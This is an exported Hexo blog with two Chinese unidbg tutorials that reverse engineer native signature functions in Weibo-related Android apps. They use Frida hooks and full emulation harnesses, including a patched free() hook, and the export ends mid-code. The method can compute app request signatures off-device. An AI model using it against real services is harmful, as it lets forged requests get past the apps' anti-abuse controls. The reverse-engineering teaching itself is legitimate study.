{"meta":{"title":"1ens's blog","subtitle":"","description":"a","author":"1ens","url":"http://example.com"},"pages":[{"title":"","date":"2024-06-29T14:08:01.142Z","updated":"2022-05-24T15:09:56.842Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"所有分类","date":"2024-06-29T14:08:01.150Z","updated":"2022-05-24T15:02:08.935Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2024-12-08T14:17:43.237Z","updated":"2024-12-08T14:17:43.237Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个菜鸡逆向选手 什么都没打出来的退役ctfer 正在学习安卓安全的小白 QQ：2585801236"},{"title":"","date":"2024-06-29T14:08:01.150Z","updated":"2022-05-24T15:03:31.990Z","comments":true,"path":"mylist/index.html","permalink":"http://example.com/mylist/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2024-06-29T14:08:01.150Z","updated":"2022-05-24T15:06:34.544Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"big lao","text":"big lao 带带"},{"title":"所有标签","date":"2024-06-29T14:08:01.151Z","updated":"2022-05-24T15:02:51.734Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"unidbg的基本使用（二）","slug":"unidbg的基本使用（二）","date":"2024-12-25T00:57:56.000Z","updated":"2024-12-25T02:38:21.582Z","comments":true,"path":"2024/12/25/unidbg的基本使用（二）/","link":"","permalink":"http://example.com/2024/12/25/unidbg%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"[Unidbg 的基本使用（二）](https://www.yuque.com/lilac-2hqvv/xdwlsg/vy2p4ts1oq8sxxgb?# 《Unidbg 的基本使用（二）》)[《补库函数（五）》](https://www.yuque.com/lilac-2hqvv/xdwlsg/bzoykwvuim3hkz2o?# 《补库函数（五）》)跟着龙哥学unidbg 目标 APK：sinaInternational.apk 目标方法实现：libutility.so 任务描述apk 反编译，找到com.sina.weibo.security，我们的目标是其中的 calculateS 函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697package com.sina.weibo.security;import android.content.Context;import android.net.wifi.WifiInfo;import android.net.wifi.WifiManager;import android.telephony.TelephonyManager;import android.text.TextUtils;import com.taobao.accs.utl.UtilityImpl;import com.umeng.message.MsgConstant;import com.weico.international.WApplication;import permissions.dispatcher.PermissionUtils;public class WeiboSecurityUtils &#123; public static WeiboSecurityUtils instance = null; private static Object mCalculateSLock = new Object(); private static String sIValue; private static String sImei = &quot;&quot;; private static String sMac = &quot;&quot;; private static String sSeed; private static String sValue; public native String calculateS(Context context, String str, String str2); public native String getIValue(Context context, String str); static &#123; System.loadLibrary(&quot;utility&quot;); &#125; private WeiboSecurityUtils() &#123; &#125; public static synchronized WeiboSecurityUtils getInstance() &#123; WeiboSecurityUtils weiboSecurityUtils; synchronized (WeiboSecurityUtils.class) &#123; if (instance == null) &#123; instance = new WeiboSecurityUtils(); &#125; weiboSecurityUtils = instance; &#125; return weiboSecurityUtils; &#125; public static String calculateSInJava(Context context, String srcArray, String pin) &#123; String str; synchronized (mCalculateSLock) &#123; if (srcArray.equals(sSeed) &amp;&amp; !TextUtils.isEmpty(sValue)) &#123; str = sValue; &#125; else if (context != null) &#123; sSeed = srcArray; sValue = getInstance().calculateS(context.getApplicationContext(), srcArray, pin); str = sValue; &#125; else &#123; str = &quot;&quot;; &#125; &#125; return str; &#125; public static String getIValue(Context context) &#123; if (!TextUtils.isEmpty(sIValue)) &#123; return sIValue; &#125; String deviceSerial = getImei(context); if (TextUtils.isEmpty(deviceSerial)) &#123; deviceSerial = getWifiMac(context); &#125; if (TextUtils.isEmpty(deviceSerial)) &#123; deviceSerial = &quot;000000000000000&quot;; &#125; if (context == null || TextUtils.isEmpty(deviceSerial)) &#123; return &quot;&quot;; &#125; String iValue = getInstance().getIValue(context.getApplicationContext(), deviceSerial); sIValue = iValue; return iValue; &#125; public static String getImei(Context context) &#123; if (TextUtils.isEmpty(sImei) &amp;&amp; context != null) &#123; if (PermissionUtils.hasSelfPermissions(WApplication.cContext, MsgConstant.PERMISSION_READ_PHONE_STATE)) &#123; sImei = ((TelephonyManager) context.getSystemService(&quot;phone&quot;)).getDeviceId(); &#125; else &#123; sImei = null; &#125; &#125; return sImei; &#125; public static String getWifiMac(Context context) &#123; if (TextUtils.isEmpty(sMac) &amp;&amp; context != null) &#123; WifiInfo mac = ((WifiManager) context.getApplicationContext().getSystemService(UtilityImpl.NET_TYPE_WIFI)).getConnectionInfo(); sMac = mac != null ? mac.getMacAddress() : &quot;&quot;; &#125; return sMac; &#125;&#125; 使用frida Hook 目标函数的返回值，代码如下。 123456789Java.perform(function() &#123; let WeiboSecurityUtils = Java.use(&quot;com.sina.weibo.security.WeiboSecurityUtils&quot;); let current_application = Java.use(&#x27;android.app.ActivityThread&#x27;).currentApplication(); let arg1 = current_application.getApplicationContext(); let arg2 = &quot;hello world&quot;; let arg3 = &quot;123456&quot;; let ret = WeiboSecurityUtils.$new().calculateS(arg1, arg2, arg3); console.log(&quot;ret:&quot;+ret);&#125;) 结果为 d74a75bb，本篇目标是使用 Unidbg 复现对 calculateS 的调用。 初始化在 Unidbg 的 unidbg-android&#x2F;src&#x2F;test&#x2F;java 下新建包和类。 123456789101112131415161718192021222324252627282930313233343536373839package com.weibo;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class WeiBo extends AbstractJni &#123; private final AndroidEmulator emulator; private final DvmClass WeiboSecurityUtils; private final VM vm; public WeiBo() &#123; emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setProcessName(&quot;com.weico.international&quot;) .build(); Memory memory = emulator.getMemory(); memory.setLibraryResolver(new AndroidResolver(23)); vm = emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/resources/weibo/sinaInternational.apk&quot;)); vm.setJni(this); vm.setVerbose(true); DalvikModule dm = vm.loadLibrary(&quot;utility&quot;, true); WeiboSecurityUtils = vm.resolveClass(&quot;com/sina/weibo/security/WeiboSecurityUtils&quot;); dm.callJNI_OnLoad(emulator); &#125; public static void main(String[] args) &#123; WeiBo wb = new WeiBo(); &#125;&#125; apk lib 目录下只包含armeabi动态库，所以没得选，只能是ARM32 创建虚拟机Unidbg 中的 VM 类代表了 Android 虚拟机环境，用于模拟和执行 JNI 方法及与底层库的交互。它不仅模拟了 Android 上的 Java 层，还提供了一些便捷的工具来加载、解析 APK 文件及其资源。主要用于模拟应用在 JNI 层的交互，执行 Android 动态链接库（SO）的操作。 createDalvikVM有两个重载方法，建议使用第二个。 1234//创建虚拟机VM dalvikVM = emulator.createDalvikVM();//创建虚拟机并指定APK文件VM dalvikVM = emulator.createDalvikVM(new File(&quot;apk file path&quot;)); Unidbg 加载 Apk 并非要做执行 DEX 甚至是运行 Apk 这样的大事，相反，它只是在做一些小事，主要包括下面两部分 解析 Apk 基本信息，减少使用者在补 JNI 环境上的工作量。Unidbg 会解析 Apk 的版本名、版本号、包名、 Apk 签名等信息。如果样本通过 JNI 调用获取这些信息，Unidbg 会替我们做处理。如果没有加载 Apk，这些逻辑就需要我们去补环境，平添了不少工作量。 解析和管理 Apk 资源文件，加载 Apk 后可以通过 openAsset获取 APK assets目录下的文件。如果样本通过AAssetManager_open等函数访问 apk 的assets，Unidbg 会替我们做处理。 Unidbg 通过依赖开源项目 apk-parser 来完成 APK 文件的解析工作。 加载 SOloadLibrary API 概述我们通过 loadLibrary API 将 SO 加载到 Unidbg 中，它有数个重载方法，下面两个使用最多。 1234567//参数一: 动态库或可执行ELF文件//参数二: 是否必须执行 init_proc、init_array 这些初始化函数DalvikModule loadLibrary(File elfFile, boolean forceCallInit);//参数一：动态库或可执行ELF的文件名//参数二: 是否必须执行 init_proc、init_array 这些初始化函数DalvikModule loadLibrary(String libname, boolean forceCallInit); **loadLibrary(String libname, boolean forceCallInit)**：该方法接受库文件的名字（不包含 lib 前缀和 .so 后缀），并且会自动处理文件的加载。这个方法的使用类似于 Java 中的 System.loadLibrary()，它会根据传入的库名自动查找并加载相应的动态库。 使用 loadLibrary 加载 SO 文件对于使用库名而非文件路径的 loadLibrary 方法，Unidbg 会自动为库名添加前缀（lib）和后缀（.so），然后尝试加载对应的 SO 文件。具体实现如下： 1234567891011121314151617@Overridepublic final DalvikModule loadLibrary(String libname, boolean forceCallInit) &#123; // 添加 lib 前缀和 .so 后缀 String soName = &quot;lib&quot; + libname + &quot;.so&quot;; LibraryFile libraryFile = findLibrary(soName); // 如果找不到目标 SO 文件，抛出异常 if (libraryFile == null) &#123; throw new IllegalStateException(&quot;load library failed: &quot; + libname); &#125; // 将库文件加载到模拟器的内存中 Module module = emulator.getMemory().load(libraryFile, forceCallInit); // 返回一个 DalvikModule 实例，表示加载的库 return new DalvikModule(this, module);&#125; **findLibrary(soName)**：这个方法会查找目标 SO 文件。如果文件路径是正确的，它会返回一个 LibraryFile 实例，代表 SO 文件的内容。如果找不到文件，抛出异常。 **emulator.getMemory().load(libraryFile, forceCallInit)**：该方法将 SO 文件加载到模拟器的内存中，确保 JNI 调用能够正常执行。forceCallInit 参数决定是否强制执行初始化函数，如 init_proc、init_array 等。 如何根据库名找到 SO 文件当你传入一个动态库的名字（如 kwsgmain）时，Unidbg 会根据以下逻辑自动查找 SO 文件： 从 APK 文件加载 SO 如果加载 APK 时已经解析了其内容，Unidbg 会从 APK 文件中的 lib/armeabi-v7a/ 或 lib/arm64-v8a/ 等目录查找 SO 文件。 32 位架构（armeabi-v7a 和 armeabi）： 1234567891011121314byte[] loadLibraryData(Apk apk, String soName) &#123; byte[] soData = apk.getFileData(&quot;lib/armeabi-v7a/&quot; + soName); if (soData != null) &#123; if (log.isDebugEnabled()) &#123; log.debug(&quot;resolve armeabi-v7a library: &quot; + soName); &#125; return soData; &#125; soData = apk.getFileData(&quot;lib/armeabi/&quot; + soName); if (soData != null &amp;&amp; log.isDebugEnabled()) &#123; log.debug(&quot;resolve armeabi library: &quot; + soName); &#125; return soData;&#125; 64 位架构（arm64-v8a）： 1234567891011byte[] loadLibraryData(Apk apk, String soName) &#123; byte[] soData = apk.getFileData(&quot;lib/arm64-v8a/&quot; + soName); if (soData != null) &#123; if (log.isDebugEnabled()) &#123; log.debug(&quot;resolve arm64-v8a library: &quot; + soName); &#125; return soData; &#125; else &#123; return null; &#125;&#125; SO 文件依赖关系的处理 Unidbg 在加载 SO 文件时，能够自动处理 SO 文件的依赖关系。即，如果一个 SO 文件依赖于其他动态库，Unidbg 会递归加载这些依赖库，确保所有的函数调用都能正确执行。这也是为什么推荐使用库名加载方法（loadLibrary(libname, true)）的原因之一。 加载从真实环境中 Dump 出的内存除了通过文件路径或库名加载 SO 文件外，Unidbg 还支持直接从字节数组加载 SO 文件： 1DalvikModule loadLibrary(String libname, byte[] raw, boolean forceCallInit); **raw**：这是从真实环境中 dump 出来的 SO 文件的字节数据。这个重载方法目前还缺少优化，因此使用上可能存在一定的限制和不稳定性，特别是对于复杂的依赖关系和初始化函数。 推荐的加载方式 在大多数情况下，推荐使用 loadLibrary(String libname, boolean forceCallInit) 方法来加载动态库。因为它能够处理 SO 文件的依赖关系，且在加载 APK 时会自动查找并加载 APK 中 lib 目录下的动态库。只传入库名（如 kwsgmain），即可自动处理前缀和后缀。 加载依赖模块如何查看依赖库在分析 SO 文件时，通常可以使用工具如 IDA、objdump 或 readelf 来查看动态库的依赖项。这些工具会列出库文件中使用的所有外部符号，并显示它们依赖的其他 SO 文件。 Unidbg 自动解析依赖库Unidbg 具有自动解析和加载依赖库的能力。它会解析一个 SO 文件的依赖关系，并尝试自动加载这些依赖项。Unidbg 使用 ElfLoader 来处理 ELF 格式的 SO 文件，它会检查是否已经加载所依赖的库。如果库尚未加载，它会尝试加载依赖库。 Android Linker（Android 系统中的动态链接器）会在系统库路径（如 /vendor/lib）和应用库路径（如 /data/app/packageName/base.apk!/lib/armeabi-v7a）中查找依赖库。 Unidbg ELF Loader 也会做类似的处理，但其实现更加简化。Unidbg 会通过以下方式来查找和加载依赖库： 如何解决依赖库的加载Unidbg 会在加载一个动态库时，检查该库是否依赖于其他库，并且尝试自动加载这些依赖库。 12345// 查找并加载依赖库LibraryFile neededLibraryFile = libraryFile.resolveLibrary(emulator, neededLibrary);if (libraryResolver != null &amp;&amp; neededLibraryFile == null) &#123; neededLibraryFile = libraryResolver.resolveLibrary(emulator, neededLibrary);&#125; resolveLibrary：这是 Unidbg 用于查找库文件的函数。它首先会查找库文件是否已经加载，如果没有加载，它会尝试通过 libraryResolver 来解析该库。 系统库的加载 Unidbg 为系统库（如 libc.so）提供了一个默认的系统库环境。你可以通过 setLibraryResolver 来指定使用哪一版本的 Android 系统库（如 SDK 19 或 SDK 23）。 SDK 23（Android 6.0）和 SDK 19（Android 4.4）是两种常用的 Android 系统库环境。 对于 64 位 SO 文件，必须选择 SDK 23，因为 Android 4.4 不支持 64 位架构。 加载依赖库的具体实现在 Unidbg 中，resolveLibrary 函数用于查找依赖库。它会根据库名和 SDK 版本查找库的路径。 123456789protected static LibraryFile resolveLibrary(Emulator&lt;?&gt; emulator, String libraryName, int sdk, Class&lt;?&gt; resClass) &#123; final String lib = emulator.is32Bit() ? &quot;lib&quot; : &quot;lib64&quot;; String name = &quot;/android/sdk&quot; + sdk + &quot;/&quot; + lib + &quot;/&quot; + libraryName.replace(&#x27;+&#x27;, &#x27;p&#x27;); URL url = resClass.getResource(name); if (url != null) &#123; return new URLibraryFile(url, libraryName, sdk, emulator.is64Bit()); &#125; return null;&#125; **resolveLibrary**：通过指定的 SDK 版本和库名，Unidbg 会构建库文件的路径并尝试从资源文件中加载。如果找到了该资源，它会返回一个 LibraryFile 实例。 用户库路径下的依赖除了系统库，Unidbg 还可以在用户的库路径下查找依赖库，通常是在 APK 文件的 lib 目录下。例如，32 位库通常位于 lib/armeabi-v7a/ 或 lib/armeabi/ 目录下，64 位库则位于 lib/arm64-v8a/ 目录下。采用 libname 方式加载 1234567891011121314151617181920@Overridepublic LibraryFile resolveLibrary(Emulator&lt;?&gt; emulator, String soName) &#123; byte[] libData = baseVM.loadLibraryData(apk, soName); return libData == null ? null : new ApkLibraryFile(baseVM, this.apk, soName, libData, packageName, is64Bit);&#125;// 32 位byte[] loadLibraryData(Apk apk, String soName) &#123; byte[] soData = apk.getFileData(&quot;lib/armeabi-v7a/&quot; + soName); if (soData != null) &#123; if (log.isDebugEnabled()) &#123; log.debug(&quot;resolve armeabi-v7a library: &quot; + soName); &#125; return soData; &#125; soData = apk.getFileData(&quot;lib/armeabi/&quot; + soName); if (soData != null &amp;&amp; log.isDebugEnabled()) &#123; log.debug(&quot;resolve armeabi library: &quot; + soName); &#125; return soData;&#125; **loadLibraryData**：此方法从 APK 文件中加载指定的 SO 文件。如果找到该文件，返回其字节数据，供后续加载使用。 手动加载多个依赖库有时，Unidbg 无法自动加载某些依赖库，用户可以手动加载多个 SO 文件： 12vm.loadLibrary(&quot;kwsgmain&quot;, true);vm.loadLibrary(&quot;abc&quot;, true); 通过这种方式，用户可以显式加载多个库，确保所有依赖都得到满足。 发起调用1234567public String callcalculateS()&#123; DvmObject&lt;?&gt; context = vm.resolveClass(&quot;android/app/Application&quot;, vm.resolveClass(&quot;android/content/ContextWrapper&quot;, vm.resolveClass(&quot;android/content/Context&quot;))).newObject(null); String arg2 = &quot;hello world&quot;; String arg3 = &quot;123456&quot;; String ret = WeiboSecurityUtils.newObject(null).callJniMethodObject(emulator, &quot;calculateS&quot;, context, arg2, arg3).getValue().toString(); return ret;&#125; 参数 2、3 都是字符串，按照前篇所述直接传入就行。 参数 1 是 Android 中最常见的 Context，为什么要这么处理？ Context 作为 Android 中最常见的参数：Context 是 Android 系统中访问系统服务和资源的核心组件，因此许多 JNI 函数会需要 Context 参数。在 unidbg 中，为了模拟 Android 环境并让这些函数正常运行，需要通过加载 Application 类来创建一个模拟的 Context 对象。 为什么要特殊处理 Context 参数：由于 unidbg 运行的是一个模拟环境，它并不具备完整的 Android 系统框架。因此，unidbg 通过 resolveClass 加载 Context 相关的类，创建了一个虚拟的 Context 对象，以便正确地模拟 JNI 调用。 报错： 123JNIEnv-&gt;FindClass(android/content/pm/PackageManager) was called from RX@0x12002c79[libutility.so]0x2c79[10:22:12 989] WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=0, svcNumber=0x11e, PC=unidbg@0xfffe0274, LR=RX@0x12002c8d[libutility.so]0x2c8d, syscall=nulljava.lang.UnsupportedOperationException: android/content/ContextWrapper-&gt;getPackageManager()Landroid/content/pm/PackageManager; Unidbg 并不完全模拟 Android 框架的所有功能。很多 Android 系统提供的类（如 PackageManager）和方法（ContextWrapper.getPackageManager()）默认是不可用的。 在这种情况下，当目标库或应用试图调用这些系统类的函数时，Unidbg 无法直接提供其实现，从而抛出 UnsupportedOperationException 异常。因此我们需要在callObjectMethod函数中实现这个函数，简单的实现则是返回它所需要的值（一般用于占位即可），补环境代码如下。 123456789@Overridepublic DvmObject&lt;?&gt; callObjectMethod(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VarArg varArg) &#123; switch (signature)&#123; case &quot;android/content/ContextWrapper-&gt;getPackageManager()Landroid/content/pm/PackageManager;&quot;:&#123; return vm.resolveClass(&quot;android/content/pm/PackageManager&quot;).newObject(null); &#125; &#125; return super.callObjectMethod(vm, dvmObject, signature, varArg);&#125; 继续运行，出现报错 1234567JNIEnv-&gt;CallObjectMethod(android.content.pm.Signature@3ac3fd8b, toByteArray() =&gt; [B@6a5fc7f7) was called from RX@0x12002d71[libutility.so]0x2d71Invalid address 0x12175000 passed to free: value not allocated[crash]A/libc: Invalid address 0x12175000 passed to free: value not allocatedexit with code: 1Exception in thread &quot;main&quot; java.lang.NullPointerException at com.weibo.Weibo.callS(Weibo.java:36) at com.weibo.Weibo.main(Weibo.java:41） 这个意思是传递给free函数的地址0x12175000是无效的，导致内存释放失败。遇到这个报错，最简单的处理办法就是 hook free 函数，替换它的实现，让它返回 0，即释放成功。当然也可以对报错的待释放内存做处理，比如只有指针地址是 0x12175000 释放失败时。补环境代码如下。 12345678910111213141516171819202122232425262728293031//在构造函数中添加emulator.attach().addBreakPoint(dm.getModule().findSymbolByName(&quot;free&quot;).getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?&gt; emulator, long address) &#123; Arm32RegisterContext registerContext = emulator.getContext(); emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, 0); emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC, registerContext.getLR()); return true; &#125;&#125;);//或者// 编写patchFree()，在构造函数中调用public void patchFree()&#123; IWhale whale = Whale.getInstance(emulator); Symbol free = memory.findModule(&quot;libc.so&quot;).findSymbolByName(&quot;free&quot;); whale.inlineHookFunction(free, new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?&gt; emulator, long originFunction) &#123; System.out.println(&quot;WInlineHookFunction free = &quot; + emulator.getContext().getPointerArg(0)); long addr = emulator.getContext().getPointerArg(0).peer; if (addr == 0x12175000 || addr == 0x12176000)&#123; return HookStatus.LR(emulator, 0); &#125; else &#123; return HookStatus.RET(emulator,originFunction); &#125; &#125; &#125;);&#125; 完整： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package com.weibo;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.arm.context.Arm32RegisterContext;import com.github.unidbg.debugger.BreakPointCallback;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.memory.Memory;import unicorn.ArmConst;import java.io.File;public class Weibo extends AbstractJni &#123; private final AndroidEmulator emulator; private final DvmClass WeiboSecurityUtils; private final VM vm; public Weibo() &#123; emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setProcessName(&quot;com.weico.international&quot;) .build(); Memory memory = emulator.getMemory(); memory.setLibraryResolver(new AndroidResolver(23)); vm = emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/resources/weibo/sinaInternational.apk&quot;)); vm.setJni(this); vm.setVerbose(true); DalvikModule dm = vm.loadLibrary(&quot;utility&quot;, true); // patch free emulator.attach().addBreakPoint(dm.getModule().findSymbolByName(&quot;free&quot;).getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?&gt; emulator, long address) &#123; Arm32RegisterContext registerContext = emulator.getContext(); emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, 0); emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC, registerContext.getLR()); return true; &#125; &#125;); WeiboSecurityUtils = vm.resolveClass(&quot;com/sina/weibo/security/WeiboSecurityUtils&quot;); dm.callJNI_OnLoad(emulator); &#125; public String callS()&#123; DvmObject&lt;?&gt; context = vm.resolveClass(&quot;android/app/Application&quot;, vm.resolveClass(&quot;android/content/ContextWrapper&quot;, vm.resolveClass(&quot;android/content/Context&quot;))).newObject(null); String arg2 = &quot;hello world&quot;; String arg3 = &quot;123456&quot;;// String ret = return WeiboSecurityUtils.newObject(null).callJniMethodObject(emulator, &quot;calculateS&quot;, context, arg2, arg3).getValue().toString(); &#125; public static void main(String[] args) &#123; Weibo wb = new Weibo(); String result = wb.callS(); System.out.println(&quot;call s result:&quot;+result); &#125; @Override public DvmObject&lt;?&gt; callObjectMethod(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VarArg varArg) &#123; switch (signature)&#123; case &quot;android/content/ContextWrapper-&gt;getPackageManager()Landroid/content/pm/PackageManager;&quot;:&#123; return vm.resolveClass(&quot;android/content/pm/PackageManager&quot;).newObject(null); &#125; &#125; return super.callObjectMethod(vm, dvmObject, signature, varArg); &#125;&#125; 1call s result:d74a75bb","categories":[],"tags":[],"keywords":[]},{"title":"unidbg的基本使用（一）","slug":"unidbg的基本使用（一）","date":"2024-12-23T09:57:03.000Z","updated":"2024-12-25T03:14:47.403Z","comments":true,"path":"2024/12/23/unidbg的基本使用（一）/","link":"","permalink":"http://example.com/2024/12/23/unidbg%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"跟着[Unidbg 的基本使用（一）](https://www.yuque.com/lilac-2hqvv/xdwlsg/gmbn45b5n6g59kks?# 《Unidbg 的基本使用（一）》)学unidbg 引言目标 APK：lvzhou.apk 目标方法声明所处的 Dex：target.dex。样本在 JAVA 层做了加壳，直接使用提供的 target.dex 目标方法实现：liboasiscore.so 任务描述使用 JADX 反编译 target.dex，找到 NativeApi 类，其中的s方法就是本篇的目标。 此处在s上右键，选择“复制为 frida 片段”即可生成对s方法的 Frida hook 代码。再用Java.perform包裹。动调目标进程获得入参和返回值。 123456789Java.perform(function() &#123; let NativeApi = Java.use(&quot;com.weibo.xvideo.NativeApi&quot;); NativeApi[&quot;s&quot;].implementation = function (bArr, z) &#123; console.log(&#x27;s is called&#x27; + &#x27;, &#x27; + &#x27;bArr: &#x27; + bArr + &#x27;, &#x27; + &#x27;z: &#x27; + z); let ret = this.s(bArr, z); console.log(&#x27;s ret value is &#x27; + ret); return ret; &#125;;&#125;) s is called, bArr: [object Object], z: falses ret value is 519858da87be0ff512648eb5e565e22e 接下来主动调用s方法，它是一个实例方法，可供参考的 Frida 代码如下。参数就是先前 Frida Call 得到的入参。 123456789101112Java.perform(function() &#123; function stringToBytes(str) &#123; var javaString = Java.use(&#x27;java.lang.String&#x27;); return javaString.$new(str).getBytes(); &#125; let NativeApi = Java.use(&quot;com.weibo.xvideo.NativeApi&quot;); let arg1 = &quot;aid=01A-khBWIm48A079Pz_DMW6PyZR8uyTumcCNm4e8awxyC2ANU.&amp;cfrom=28B5295010&amp;cuid=5999578300&amp;noncestr=46274W9279Hr1X49A5X058z7ZVz024&amp;platform=ANDROID&amp;timestamp=1621437643609&amp;ua=Xiaomi-MIX2S__oasis__3.5.8__Android__Android10&amp;version=3.5.8&amp;vid=1019013594003&amp;wm=20004_90024&quot;; let arg2 = false; let ret = NativeApi.$new().s(stringToBytes(arg1), arg2); console.log(&quot;ret:&quot;+ret);&#125;) 输出为3882b522d0c62171d51094914032d5ea 我们的目标是使用 Unidbg 复现对 s 方法的调用，并得到和 Frida Call 一致的结果。 初始化我们的代码写在 unidbg-android&#x2F;src&#x2F;test&#x2F;java 路径下 新建com.bilibili包和对应的xvideo类 继承AbstractJni类，并创建构造函数 123456789101112131415161718192021222324252627282930313233343536373839package com.bilibili;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class xvideo extends AbstractJni &#123; private final AndroidEmulator emulator; private final DvmClass NativeApi; private final VM vm; public xvideo() &#123; emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new Unicorn2Factory(true)) .setProcessName(&quot;com.sina.oasis&quot;) .build(); Memory memory = emulator.getMemory(); memory.setLibraryResolver(new AndroidResolver(23)); vm = emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/resources/bilibili/lvzhou.apk&quot;)); vm.setJni(this); vm.setVerbose(true); DalvikModule dm = vm.loadLibrary(&quot;oasiscore&quot;, true); NativeApi = vm.resolveClass(&quot;com/weibo/xvideo/NativeApi&quot;); dm.callJNI_OnLoad(emulator); &#125; public static void main(String[] args) &#123; xvideo xv = new xvideo(); &#125;&#125; 看起来有些复杂，包含初始化模拟器、初始化内存、设置依赖库路径、创建虚拟机处理器、加载目标 SO、执行其 JNI_OnLoad 函数这一系列操作。 在设计模式上，这是一个典型的建造者模式。以 AndroidEmulatorBuilder 为起点，使用链式调用，一步步把符合使用者需求的 Unidbg 模拟器实例构造出来 12345emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new Unicorn2Factory(true)) .setProcessName(&quot;com.sina.oasis&quot;) .build(); 位数与架构Unidbg支持的架构Unidbg是一个专门为ARM架构设计的模拟器，并不支持X86或其他架构。因此，Unidbg中的for64Bit和for32Bit仅仅用于选择ARM架构的32位或64位模式： for32Bit表示模拟32位的ARM架构（ARM32）。 for64Bit表示模拟64位的ARM架构（ARM64）。 如果应用只提供32位SO，64位设备可以向下兼容32位，因此所有设备都能运行。如果应用只提供64位SO，则32位设备无法运行。 核心限制： 当选择32位模式时，传入的动态库必须是ARM32架构的（ElfFile.ARCH_ARM）。 当选择64位模式时，传入的动态库必须是ARM64架构的（ElfFile.ARCH_AARCH64）。 apk lib 里只有armeabi-v7a，那就只能选择 32 位，apk lib 里只有arm64-v8a，就选择 64 位。 进程名setProcessName 是 Unidbg 中用来设置进程名的方法。 如果不设置，Unidbg 默认将进程名设置为 &quot;unidbg&quot;，这可能会导致程序中的 getprogname 返回 &quot;unidbg&quot;，进而引发不可预期的行为。 对应源代码逻辑如下。 1this.processName = processName == null ? &quot;unidbg&quot; : processName; 后端addBackendFactory用于设置指令执行引擎（推荐使用 Unicorn2） 处理器的基本任务是执行汇编指令，操作系统的基本任务是管理、调度资源并提供服务，应用程序依赖于 CPU 执行指令，基于操作系统提供的 API 实现功能。 而在 Unidbg 里，为了让程序感觉自己在操作系统里，做了如下设计。 在 Unidbg 中，后端（Backend） 负责模拟处理器的指令执行。后端就像是指令执行引擎，处理所有与 CPU 相关的任务。在一个完整的计算机系统中，处理器 执行指令，操作系统 提供资源管理和服务，而应用程序则依赖处理器和操作系统来执行代码和实现功能。 具体到 Unidbg，它模拟了一个有限的操作系统环境来运行动态库（SO 文件），并通过后端负责执行指令。Unidbg 的设计目的是让运行在模拟环境中的程序，感知到自己正在真实的 Android 系统上运行，即使它实际上是在一个模拟的环境中。 Unidbg 支持多种后端（Backend）引擎，每个后端都是一个指令模拟器，负责模拟处理器的行为。具体来说，Unidbg 目前支持以下五种后端： Unicorn：最早的后端，基于 Unicorn 模拟器实现。 Unicorn2：Unicorn 的改进版本，支持更多功能和更好的性能。 Dynarmic：一个 ARM 的 JIT 模拟器，优化了模拟器的速度。 Hypervisor：用于虚拟化环境中，支持更高级的硬件虚拟化。 KVM：利用 Linux 的 KVM 虚拟化技术进行模拟。 默认后端： 如果没有显式指定后端，Unidbg 默认使用 Unicorn Backend，即 Unicorn 后端来执行指令模拟。 尽管 Unicorn 是一个功能非常强大的后端，但在最新的 Unidbg 中，推荐使用 Unicorn2，尤其是因为 Unicorn2 增强了多线程支持，这对于现代应用程序的运行和性能至关重要。 123456789101112public static Backend createBackend(Emulator&lt;?&gt; emulator, boolean is64Bit, Collection&lt;BackendFactory&gt; backendFactories) 